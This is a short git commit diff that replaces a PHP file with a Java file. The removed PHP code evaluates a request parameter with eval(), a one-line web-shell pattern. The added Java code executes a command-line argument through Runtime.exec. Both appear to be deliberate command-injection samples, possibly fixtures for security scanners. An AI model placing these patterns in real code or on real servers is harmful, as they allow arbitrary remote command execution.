a1ac0701a9878e2e694ad19dfffde02c497761c6
andylin <2273941148@qq.com>
2023-01-12 14:52:20 +0800

    Update and rename test.php to test.java

---
+++ test.java
@@ -0,0 +1,6 @@
+class A {
+  public static void main(String[] args) {
+    String cmd = args[1];
+    Runtime.getRuntime().exec(cmd);
+  }
+}
--- test.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-$a = array("1", $_GET["X"], "3");
-eval($a[0]);
-eval($a[1]);
